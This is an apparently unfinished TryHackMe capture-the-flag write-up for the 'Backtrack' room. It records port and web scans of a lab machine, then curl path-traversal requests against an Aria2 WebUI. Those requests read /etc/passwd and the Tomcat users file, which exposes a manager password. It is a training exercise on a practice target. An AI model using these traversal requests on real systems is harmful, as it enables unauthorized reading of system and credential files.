<h1 align="center">Backtrack</h1>
<p align="center"><img width="80px" src=""https://github.com/user-attachments/assets/f16e3c98-b80c-43c9-87a8-eef325cab742"><br>
2025, September 11<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>493</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>Daring to set foot where no one has</em>.<br>
Access it <a href="https://tryhackme.com/room/backtrack"</a>here.<br>
<img width="1200px" src=""></p>


<h2>Task 1 . Deploy the machine and Get the Flags!</h2>
<p>Compromise the machine and get the flags.<br>

Note: Please allow at least 5 minutes for the machine to boot and configure.</p>

<p><em>Answer the questions below</em></p>

<p>1.1. What is the content of flag1.txt<br>
<code></code></p>

<p>1.2. What is the content of flag2.txt<br>
<code></code></p>

<p>1.3. What is the content of flag3.txt<br>
<code></code></p>


<h2>nmap</h2>

<p>


- 
</p>

```bash
:~/Backtrack# nmap -sT -p- -T4 xx.xxx.xx.xxx
...
PORT     STATE SERVICE
22/tcp   open  ssh
6800/tcp open  unknown
8080/tcp open  http-proxy
8888/tcp open  sun-answerbook
```

<p>

- 8888 : Aria2 WebUI 1.1</p>

```bash
:~/Backtrack# nmap -sC -sV -Pn -p- -T4 xx.xxx.xx.xxx
...
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
6800/tcp open  http            aria2 downloader JSON-RPC
|_http-title: Site doesn't have a title.
8080/tcp open  http            Apache Tomcat 8.5.93
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.93
8888/tcp open  sun-answerbook?
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/html
|     Date: Thu, 11 Sep 2025 xx:xx:xx GMT
|     Connection: close
|     <!doctype html>
|     <html>
|     <!-- {{{ head -->
|     <head>
|     <link rel="icon" href="../favicon.ico" />
|     <meta charset="utf-8">
|     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <meta name="theme-color" content="#0A8476">
|     <title ng-bind="$root.pageTitle">Aria2 WebUI</title>
|     <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Lato:400,700">
|     <link href="app.css" rel="stylesheet"><script type="text/javascript" src="vendor.js"></script><script type="text/javascript" src="app.js"></script></head>
|     <!-- }}} -->
|     <body ng-controller="MainCtrl" ng-cloak>
|     <!-- {{{ Icons -->
|_    <svg aria-hidden="true" style="position: absolute; width: 0; height: 0; overflow: hidden;" version="1.1" xm
```

<h2>nikto</h2>

```bash
~/Backtrack# nikto -h xx.xxx.xx.xxx:6800
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xxx.xx.xxx
+ Target Hostname:    xx.xxx.xx.xxx
+ Target Port:        6800
+ Start Time:         2025-09-11 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ 6544 items checked: 13 error(s) and 1 item(s) reported on remote host
+ End Time:           2025-09-11 xx:xx:xx (GMT1) (9 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```bash
:~/Backtrack# nikto -h xx.xxx.xx.xxx:8080
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xxx.xx.xxx
+ Target Hostname:    xx.xxx.xx.xxx
+ Target Port:        8080
+ Start Time:         2025-09-11 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server leaks inodes via ETags, header found with file /favicon.ico, fields: 0xW/21630 0x1692830594000 
+ OSVDB-39272: favicon.ico file identifies this server as: Apache Tomcat
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-3931: /myphpnuke/links.php?op=MostPopular&ratenum=[script]alert(document.cookie);[/script]&ratetype=percent: myphpnuke is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
+ OSVDB-4598: /members.asp?SF=%22;}alert(223344);function%20x(){v%20=%22: Web Wiz Forums ver. 7.01 and below is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
+ OSVDB-2946: /forum_members.asp?find=%22;}alert(9823);function%20x(){v%20=%22: Web Wiz Forums ver. 7.01 and below is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
+ Uncommon header 'x-frame-options' found, with contents: DENY
+ Uncommon header 'x-content-type-options' found, with contents: nosniff
+ /manager/html: Default Tomcat Manager interface found
+ 6544 items checked: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2025-09-11 xx:xx:xx (GMT1) (13 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

<p>

-  /../../../../../../../../../../etc/passwd<br>
- /../../../../../../../../../../etc/passwd<br>
- /ca/..\\..\\..\\..\\..\\..\\/\\etc/\\passwd<br>
- ////////../../../../../../etc/passwd<br>
- /htdocs/../../../../../../../../../../../etc/passwd</p>

```bash
:~/Backtrack# nikto -h xx.xxx.xx.xxx:8888
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xxx.xx.xxx
+ Target Hostname:    xx.xxx.xx.xxx
+ Target Port:        8888
+ Start Time:         2025-09-11 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /DomainFiles/*//../../../../../../../../../../etc/passwd: Communigate Pro 4.0b to 4.0.2 allow any file to be retrieved from the remote system.
+ /../../../../../../../../../../etc/passwd: It is possible to read files on the server by adding ../ in front of file name.
+ /ca/..\\..\\..\\..\\..\\..\\/\\etc/\\passwd: It is possible to read files on the server by adding through directory traversal by adding multiple /\\.. in front of file name.
+ OSVDB-3133: ////////../../../../../../etc/passwd: Xerox WorkCentre allows any file to be retrieved remotely.
+ OSVDB-18255: /htdocs/../../../../../../../../../../../etc/passwd: SAP Internet Graphics Server (IGS) directory traversal
+ 6544 items checked: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2025-09-11 xx:xx:xx (GMT1) (11 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

<h2>gobuster</h2>

```bash
:~/Backtrack# gobuster dir -u http://xx.xxx.xx.xxx:6800/ -w /usr/share/dirb/wordlists/common.txt
...
```

```bash
:~/Backtrack# gobuster dir -u http://xx.xxx.xx.xxx:8080/ -w /usr/share/dirb/wordlists/common.txt
...
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/favicon.ico          (Status: 200) [Size: 21630]
/host-manager         (Status: 302) [Size: 0] [--> /host-manager/]
/manager              (Status: 302) [Size: 0] [--> /manager/]
Progress: 4614 / 4615 (99.98%)
```

```bash
:~/Backtrack# gobuster dir -u http://xx.xxx.xx.xxx:8080/manager/ -w /usr/share/dirb/wordlists/common.txt
...
/css                  (Status: 302) [Size: 0] [--> /manager/css/]
/html                 (Status: 401) [Size: 2499]
/images               (Status: 302) [Size: 0] [--> /manager/images/]
/status               (Status: 401) [Size: 2499]
/text                 (Status: 401) [Size: 2499]
Progress: 46
```

```bash
:~/Backtrack# gobuster dir -u http://xx.xxx.xx.xxx:8888/ -w /usr/share/dirb/wordlists/common.txt
...
/flags                (Status: 500) [Size: 82]
/index.html           (Status: 200) [Size: 80665]
Progress: 4614 / 4615 (99.98%)
```

```bash
:~/Backtrack# gobuster dir -u http://xx.xxx.xx.xxx:8888/flags/ -w /usr/share/dirb/wordlists/common.txt
...
/flags                (Status: 500) [Size: 82]
/index.html           (Status: 200) [Size: 80665]
Progress: 4614 / 4615 (99.98%)
```

```bash

```

```bash

```

<h2>port 6800</h2>

<img width="1374" height="268" alt="image" src="https://github.com/user-attachments/assets/5b4c28dd-3908-4128-82b7-0a5b257e351c" />

<br>
<br>
<h2>Web port 8080, Apache Tomcat 8.5.93</h2>

<img width="857" height="785" alt="image" src="https://github.com/user-attachments/assets/58ae71b9-9ac6-40d4-988c-277fd00078ac" />

<br>
<br>

<img width="1361" height="528" alt="image" src="https://github.com/user-attachments/assets/4673cdc8-35a4-4ff6-8e29-88dea100cbe3" />

<br>
<br>
<h2>Web port 8888</h2>

<img width="1363" height="646" alt="image" src="https://github.com/user-attachments/assets/84d936dd-bf53-4ebe-a752-89e8dcf9e360" />


<br>
<br>
<p>

- version 1.35.0</p>

<img width="1363" height="645" alt="image" src="https://github.com/user-attachments/assets/261f49f6-d121-43df-acaf-c64b89642aa8" />



<br>
<br>
<h2>Web port 8888  .  /etc/passwd</h2>

```bash
curl --path-as-is http://10.201.93.190:8888/../../../../../../../../../../etc/passwd
```

<img width="1237" height="658" alt="image" src="https://github.com/user-attachments/assets/a964d269-50d4-4cf8-b5c2-ecba4d3b9f16" />


<br>
<br>
<h2>:8888/flags</h2>
<p>

- Error: ENOENT: no such file or directory, open '/opt/aria2/docs/flags//index.html'</p>


<h2>Web port 8888  .  /opt/tomcat/conf/tomcat-users.xml</h2>

```bash
~/Backtrack# curl --path-as-is http://10.201.93.190:8888/../../../../../../../../opt/tomcat/conf/tomcat-users.xml
<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">

  <role rolename="manager-script"/>
  <user username="tomcat" password="OPx52k53D8OkTZpx4fr" roles="manager-script"/>

</tomcat-users>
```

```bash

```

```bash

```

```bash

```




